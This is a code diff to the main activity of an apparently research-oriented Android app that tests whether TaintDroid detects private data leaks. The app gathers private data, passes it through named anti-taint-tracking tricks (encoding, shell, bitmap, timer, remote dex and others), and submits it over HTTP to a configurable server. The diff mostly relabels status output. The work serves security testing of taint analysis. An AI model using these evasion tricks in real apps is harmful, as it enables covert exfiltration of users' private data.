@@ -76,12 +76,14 @@ public class MainActivity extends Activity {
 			 */
 
 			data = utils.collectPrivateData();
+			String trickName = "";
 
 			if (clickItem == "Tainted Variable Test") {
 				for (String key : data.keySet()) {
 					String val = data.get(key);
 					data.put(key, val);
 				}
+				trickName = "[TEST]";
 				// Toast.makeText(
 				// getApplicationContext(),
 				// "Don't fret. TaintDroid should detect it and "
@@ -94,14 +96,16 @@ public class MainActivity extends Activity {
 					data.put(key, "FILE( " + untaint.fileTest(val, false)
 							+ " )");
 				}
+				trickName = "[FILE]";
 			}
 
 			if (clickItem == "Simple Encoding Trick") {
 				for (String key : data.keySet()) {
 					String val = data.get(key);
-					data.put(key, "ENCODED( " + untaint.encodingTrick(val)
+					data.put(key, "ENCODE( " + untaint.encodingTrick(val)
 							+ " )");
 				}
+				trickName = "[ENCODE]";
 			}
 
 			if (clickItem == "Shell Command Trick") {
@@ -109,6 +113,7 @@ public class MainActivity extends Activity {
 					String val = data.get(key);
 					data.put(key, "SHELL( " + untaint.shellTrick(val) + " )");
 				}
+				trickName = "[SHELL]";
 			}
 
 			if (clickItem == "File+Shell Hybrid Trick") {
@@ -117,6 +122,7 @@ public class MainActivity extends Activity {
 					data.put(key, "HYBRID( " + untaint.fileTest(val, true)
 							+ " )");
 				}
+				trickName = "[HYBRID]";
 			}
 
 			if (clickItem == "Bitmap Cache Trick") {
@@ -125,6 +131,7 @@ public class MainActivity extends Activity {
 					data.put(key, "BITMAP( " + untaint.bitmapCacheTrick(val)
 							+ " )");
 				}
+				trickName = "[BITMAP]";
 			}
 
 			if (clickItem == "Timekeeper Trick") {
@@ -132,6 +139,7 @@ public class MainActivity extends Activity {
 					String val = data.get(key);
 					data.put(key, "TIMER( " + untaint.timerTrick(val) + " )");
 				}
+				trickName = "[TIMER]";
 			}
 
 			if (clickItem == "Lookup Table Trick") {
@@ -140,6 +148,7 @@ public class MainActivity extends Activity {
 					data.put(key, "LOOKUP( " + untaint.lookupTableTrick(val)
 							+ " )");
 				}
+				trickName = "[LOOKUP]";
 			}
 
 			if (clickItem == "Count-to-X Trick") {
@@ -147,6 +156,7 @@ public class MainActivity extends Activity {
 					String val = data.get(key);
 					data.put(key, "COUNT( " + untaint.countToXTrick(val) + " )");
 				}
+				trickName = "[COUNT]";
 			}
 
 			if (clickItem == "File Length Trick") {
@@ -155,6 +165,7 @@ public class MainActivity extends Activity {
 					data.put(key, "FILELEN( " + untaint.fileLengthTrick(val)
 							+ " )");
 				}
+				trickName = "[FILELEN]";
 			}
 
 			if (clickItem == "Clipboard Trick") {
@@ -163,6 +174,7 @@ public class MainActivity extends Activity {
 					data.put(key, "CLIPBOARD( " + untaint.clipboardTrick(val)
 							+ " )");
 				}
+				trickName = "[CLIPBOARD]";
 			}
 
 			if (clickItem == "Bitmap Pixel Trick") {
@@ -171,6 +183,7 @@ public class MainActivity extends Activity {
 					data.put(key, "PIXEL( " + untaint.bitmapPixelTrick(val)
 							+ " )");
 				}
+				trickName = "[PIXEL]";
 			}
 
 			if (clickItem == "Text Scaling Trick") {
@@ -179,6 +192,7 @@ public class MainActivity extends Activity {
 					data.put(key, "TXTSCALE( " + untaint.textScalingTrick(val)
 							+ " )");
 				}
+				trickName = "[TXTSCALE]";
 			}
 
 			if (clickItem == "Exception/Error Trick") {
@@ -187,6 +201,7 @@ public class MainActivity extends Activity {
 					data.put(key, "EXCEPTION( " + untaint.exceptionTrick(val)
 							+ " )");
 				}
+				trickName = "[EXCEPTION]";
 			}
 
 			if (clickItem == "Direct Buffer Trick") {
@@ -195,6 +210,7 @@ public class MainActivity extends Activity {
 					data.put(key, "BUFFER( " + untaint.directBufferTrick(val)
 							+ " )");
 				}
+				trickName = "[BUFFER]";
 			}
 
 			if (clickItem == "Remote Control Trick") {
@@ -203,6 +219,7 @@ public class MainActivity extends Activity {
 					data.put(key, "RCTRL( " + untaint.remoteControlTrick(val)
 							+ " )");
 				}
+				trickName = "[RCTRL]";
 			}
 
 			if (clickItem == "Remote Dex Trick") {
@@ -210,6 +227,7 @@ public class MainActivity extends Activity {
 					String val = data.get(key);
 					data.put(key, "RDEX( " + untaint.remoteDexTrick(val) + " )");
 				}
+				trickName = "[RDEX]";
 			}
 
 			if (clickItem == "File LastModified Trick") {
@@ -217,6 +235,7 @@ public class MainActivity extends Activity {
 					String val = data.get(key);
 					data.put(key, "LASTMOD( " + untaint.testTrick(val) + " )");
 				}
+				trickName = "[LASTMOD]";
 			}
 
 			long endTime = System.nanoTime();
@@ -231,8 +250,8 @@ public class MainActivity extends Activity {
 			Log.d(MyApp.TAG, "TRICK-TIMING: " + clickItem + " "
 					+ trickWastedTime + " DATA-LEN: " + dataLen);
 
-			utils.statusUpdate("● " + utils.timeNow()
-					+ " Stealing your private data ... ");
+			utils.statusUpdate("● " + utils.timeNow() + " " + trickName
+					+ " stealing data ... ");
 
 			httpResponse = utils.httpSubmit(data);
 
@@ -280,7 +299,11 @@ public class MainActivity extends Activity {
 
 			return true;
 
-		} else if (item.getItemId() == R.id.optionMenuSettings) {
+		} else if (item.getItemId() == R.id.optionMenuClear) {
+			TextView tv = (TextView) MyApp.context.findViewById(R.id.textview);
+			tv.setText("");
+		}
+		else if (item.getItemId() == R.id.optionMenuSettings) {
 			AlertDialog.Builder alert = new AlertDialog.Builder(MyApp.context);
 
 			alert.setTitle("Specify Server Address");
@@ -328,13 +351,14 @@ public class MainActivity extends Activity {
 		super.onCreate(savedInstanceState);
 
 		MyApp.context = this;
-
+		MyApp.context.setTitle(R.string.app_title);
+		
 		utils = new UtilityFunctions();
 		untaint = new UntaintTricks();
 
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.main);
-
+		
 		TextView tv = (TextView) findViewById(R.id.textview);
 		tv.setMovementMethod(new ScrollingMovementMethod());
 
